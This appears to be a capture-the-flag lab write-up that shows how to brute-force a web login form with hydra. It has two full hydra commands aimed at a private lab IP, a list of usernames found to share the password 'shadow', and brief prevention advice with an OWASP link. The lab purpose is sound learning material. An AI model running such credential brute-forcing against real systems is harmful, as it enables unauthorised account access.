
# How to get the flag

By using hydra :
```
sudo hydra \
	-L 10K_common_usernames.txt \ # option to add login text file
	-P 10K_common_passwords.txt \ # option to add password text file
	10.211.55.6 \ # target ip
	http-get-form \ # module to use, in this case the website sends a get method when form submitted to the server
	"/:page=signin&username=^USER^&password=^PASS^&Login=Login#:WrongAnswer.gif" 
		^
		| <- "login_page:request_sent:condition_text"
```

You can found credentials, some example :
-  login: info   password: shadow
-  login: admin   password: shadow
-  login: 2000   password: shadow
-  login: michael   password: shadow
-  login: NULL   password: shadow
-  login: john   password: shadow
-  login: david   password: shadow
-  login: robert   password: shadow
-  login: chris   password: shadow
-  login: mike   password: shadow
-  login: dave   password: shadow
-  login: richard   password: shadow
-  login: 123456   password: shadow
-  login: thomas   password: shadow
-  login: steve   password: shadow
-  login: mark   password: shadow
-  login: andrew   password: shadow
-  login: daniel   password: shadow
-  login: george   password: shadow
-  login: paul   password: shadow
-  login: charlie   password: shadow
-  login: dragon   password: shadow
-  login: james   password: shadow
-  login: qwerty   password: shadow
-  login: martin   password: shadow
-  login: master   password: shadow
-  login: pussy   password: shadow
-  login: mail   password: shadow

They all use the password shadow so we could find every single username that shares this password with the command:
```
sudo hydra -L 10K_common_usernames.txt -p shadow 10.211.55.6 http-get-form "/:page=signin&username=^USER^&password=^PASS^&Login=Login#:WrongAnswer.gif"
```

# How to prevent attack

You can limit login attempts, use Two-Factor Authentication or use CAPTCHAs.


# Documentation

https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks